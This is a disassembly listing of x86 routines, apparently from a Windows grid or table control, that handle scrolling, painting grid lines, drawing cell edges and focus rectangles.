mov [ ebp - 0x8 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x21c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebx + 0x24c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebx + 0x238 ]
mov [ ebp - 0x2c ] ecx
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x23c ]
mov [ ebp - 0x28 ] eax
dec edx
mov [ ebp - 0x20 ] edx
xor edi edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x4 ]
test esi esi
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
neg esi
push ebp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebx + 0x220 ]
lea eax [ ebx + 0x21c ]
mov ecx [ ebx + 0x230 ]
call sub_45b8a0
pop ecx
mov edi eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x258 ]
cmp esi eax
jg r-xdata
push ebp
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x250 ]
lea eax [ ebx + 0x24c ]
mov ecx [ ebx + 0x234 ]
call sub_45b8a0
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x25c ]
cmp esi eax
jg r-xdata
push 0x1
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_45db70
lea eax [ ebp - 0x3c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
dec eax
mov [ ebp - 0x24 ] eax
dec eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax ebx
mov si 0xffa8
call sub_403324
mov eax [ ebp - 0x10 ]
cmp eax [ ebx + 0x228 ]
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax ebx
call sub_43b390
push eax
call ScrollWindow
mov eax ebx
call sub_43b390
push eax
call UpdateWindow
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax ebx
call sub_45e3b4
mov edx [ ebp - 0xc ]
cmp edx [ ebx + 0x22c ]
je r-xdata
sub_45bb24
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov esi eax
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_45db70
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_45bb74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45bb24
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45bba8
push ebx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x28d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
test [ ebx + 0x249 ] 0x20
jne r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
call sub_45bc04
test al al
jne r-xdata
sub_45bc04
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_44c6fc
test eax eax
je r-xdata
call GetFocus
mov edi eax
jmp r-xdata
cmp esi [ eax + 0x220 ]
jne r-xdata
push edi
call IsWindow
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
cmp edi [ esi + 0x180 ]
jne r-xdata
push edi
call GetParent
mov edi eax
mov bl 0x1
jmp r-xdata
sub_45bca4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_45bc94
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0x102
mov eax esi
call sub_43b390
push eax
call PostMessageA
sub_45bcdc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_417700
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_417708
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_417650
mov ecx eax
mov edx esi
mov eax edi
call sub_45fedc
inc esi
dec ebx
jne r-xdata
sub_45bd1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_417700
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_417708
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_417650
mov ecx eax
mov edx esi
mov eax edi
call sub_46024c
inc esi
dec ebx
jne r-xdata
sub_45bd5c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_418f4c
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_418f54
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45fdbc
mov edx eax
mov eax ebp
call sub_418ed8
inc esi
dec ebx
jne r-xdata
sub_45bd9c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_418f4c
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_418f54
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45fddc
mov edx eax
mov eax ebp
call sub_418ed8
inc esi
dec ebx
jne r-xdata
sub_45bddc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x220 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x220 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x220 ]
call sub_45ad28
xor al 0x1
pop ebx
pop ebp
retn
sub_45be20
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x250 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_45ad28
xor al 0x1
pop ebx
pop ebp
retn
sub_45be64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4386d0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28f ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
push sub_45bcdc
mov eax [ ebp - 0x8 ]
push eax
push sub_45bd5c
push ebp
call sub_45bddc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_45bd1c
mov eax [ ebp - 0x8 ]
push eax
push sub_45bd9c
push ebp
call sub_45be20
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_45bf08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x228 ]
mov ecx esi
mov eax ebx
call sub_45e2f8
push edi
lea edx [ ebx + 0x210 ]
mov ecx esi
mov eax ebx
call sub_45e2f8
push edi
lea edx [ ebx + 0x280 ]
mov ecx esi
mov eax ebx
call sub_45e2f8
xor eax eax
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_45fe4c
mov [ esp + 0xc ] eax
cmp edi esi
jle r-xdata
lea ecx [ edi + 0x1 ]
lea ebp [ esi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x220 ]
call sub_45acd0
lea ecx [ edi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x224 ]
call sub_45acd0
mov [ esp ] edi
mov [ esp + 0x8 ] esi
mov [ esp ] esi
mov [ esp + 0x8 ] edi
jmp r-xdata
mov eax ebx
call sub_4603e8
mov eax ebx
mov si 0xffa5
call sub_403324
mov edx esp
mov eax ebx
call sub_45dcec
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffaa
call sub_403324
cmp [ ebx + 0x220 ] 0x0
je r-xdata
sub_45bfe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x22c ]
mov ecx esi
mov eax ebx
call sub_45e2f8
push edi
lea edx [ ebx + 0x214 ]
mov ecx esi
mov eax ebx
call sub_45e2f8
push edi
lea edx [ ebx + 0x284 ]
mov ecx esi
mov eax ebx
call sub_45e2f8
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffa9
call sub_403324
cmp [ ebx + 0x250 ] 0x0
je r-xdata
lea ecx [ edi + 0x1 ]
lea edx [ esi + 0x1 ]
lea eax [ ebx + 0x250 ]
call sub_45acd0
mov eax ebx
call sub_4603e8
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffa4
call sub_403324
sub_45c070
push ebx
push esi
push edi
add esp 0xffffff90
mov edi ecx
mov esi edx
mov ebx eax
mov al [ ebx + 0x28e ]
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
cmp [ esp ] 0x0
setne al
add esp 0x70
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_45cd48
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xcc ]
sub_45c0c8
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x28d ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
je r-xdata
push esp
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_45bb74
mov edx esp
mov eax [ ebx + 0x27c ]
call sub_45b630
sub_45c114
pop ecx
mov edx esp
add eax 0x3
and eax 0xfffffffc
cmp eax 0xffc
jle r-xdata
sub esp eax
mov eax esp
push edx
mov edx esp
sub edx 0x4
push edx
push ecx
retn
sub esp 0xffc
push eax
sub eax 0x1000
jns r-xdata
add eax 0x1000
sub_45c15c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x208 ]
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x244 ]
mov eax [ esi + 0x10 ]
call sub_41cb74
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41ca48
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x10 ]
call sub_41ca48
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + ecx * 4 ]
mov ecx [ ebx ]
shr ecx 0x1
add edx ecx
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x10 ]
call sub_41ca40
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x10 ]
call sub_41cb6c
push eax
push 0x12200
call ExtCreatePen
mov edx eax
mov eax [ esi + 0x10 ]
call sub_41cb08
mov eax [ esi + 0x10 ]
call sub_41cb6c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] edx
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
add eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0xc ]
shl eax 0x2
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
shr eax 0x2
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call PolyPolyline
cmp edi [ ebx + 0x10 ]
jg r-xdata
inc edi
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx eax
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] esi
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
mov [ ecx + edx * 4 ] esi
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ edx + eax * 4 ] ecx
add [ ebp - 0xc ] 0x2
sub_45c344
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0xc ]
je r-xdata
test bl bl
jne r-xdata
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_45c15c
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_45c15c
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_45c15c
pop ecx
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_45c15c
pop ecx
jmp r-xdata
sub_45c3d4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x1c ]
add ebx 0xfffffffc
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x29 ] eax
jmp r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2d ] eax
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
call sub_45fddc
add eax [ ebp - 0x29 ]
mov [ ebp - 0x21 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add eax [ ebp - 0x21 ]
mov [ ebp - 0x29 ] eax
inc [ ebp - 0xc ]
mov eax [ ebx ]
cmp edi [ eax + 0x21c ]
jl r-xdata
mov eax [ ebx ]
mov edx edi
call sub_45fdbc
add eax [ ebp - 0x2d ]
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x25 ]
cmp eax [ ebp - 0x2d ]
jle r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add eax [ ebp - 0x25 ]
mov [ ebp - 0x2d ] eax
inc edi
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call RectVisible
test eax eax
je r-xdata
mov al [ ebp + 0x8 ]
mov [ ebp - 0xd ] al
mov eax [ ebx ]
call sub_45bc04
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea ecx [ eax - 0x80 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45a938
test al al
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
test [ ebp - 0xd ] 0x2
je r-xdata
or [ ebp - 0xd ] 0x1
mov eax [ ebx ]
cmp edi [ eax + 0x228 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x4
je r-xdata
or [ ebp - 0xd ] 0x2
mov eax [ ebx ]
mov esi [ eax + 0x208 ]
mov eax [ ebx ]
mov edx [ eax + 0x68 ]
mov eax esi
call sub_41d39c
test [ ebp - 0xd ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_41cd48
test [ ebp - 0xd ] 0x2
je r-xdata
lea eax [ ebp - 0x2d ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
test [ ebp - 0xd ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov edx 0xff00000d
call sub_41cd48
mov eax [ esi + 0xc ]
mov edx 0xff00000e
call sub_41c55c
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
lea edx [ ebp - 0x2d ]
mov eax esi
call sub_41d120
test [ ebp - 0xd ] 0x2
je r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
mov edx [ ebp + 0x1c ]
or eax [ edx - 0x88 ]
je r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x3d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x4
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x8
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add [ ebp - 0x35 ] eax
jmp r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x88 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add [ ebp - 0x31 ] eax
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x1d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call DrawFocusRect
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call DrawFocusRect
jmp r-xdata
sub_45c70a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
lea edi [ ebp - 0x70 ]
mov eax [ ebx ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d47c
mov edx edi
mov eax [ ebx ]
call sub_45cd48
cmp [ edi ] 0x0
jg r-xdata
mov dl 0x1
mov eax [ ebx ]
call sub_45d234
mov esi 0xc0c0c0
mov eax [ ebx ]
mov edx [ edi + 0x40 ]
sub edx [ eax + 0x25c ]
mov eax [ ebx ]
add edx [ eax + 0x23c ]
mov eax [ ebx ]
push [ eax + 0x258 ]
mov eax [ edi + 0x10 ]
pop ecx
sub eax ecx
mov ecx [ ebx ]
add eax [ ecx + 0x238 ]
call sub_4233b8
add eax 0x3
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x3
add eax eax
call sub_45c114
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_45c114
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx 0x2
mov edx [ ebp - 0xc ]
call sub_45c108
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
call sub_41c09c
cmp eax 0xc0c0c0
jne r-xdata
cmp [ edi + 0x30 ] 0x0
jle r-xdata
push ebp
push 0x0
xor eax eax
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_45c344
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_45c344
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
xor eax eax
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_45c344
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push esi
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x4
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x8
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_45c344
pop ecx
mov eax [ ebp - 0x10 ]
call sub_45c144
mov eax [ ebp - 0x8 ]
call sub_45c144
mov esi 0x808080
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
call sub_45fdfc
xor eax eax
mov [ ebp - 0x84 ] eax
xor eax eax
mov [ ebp - 0x88 ] eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
je r-xdata
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x88 ] 0x1
push ebp
push 0x0
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_45c3d4
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_45c3d4
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
xor ecx ecx
xor eax eax
call sub_45c3d4
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x8 ]
push eax
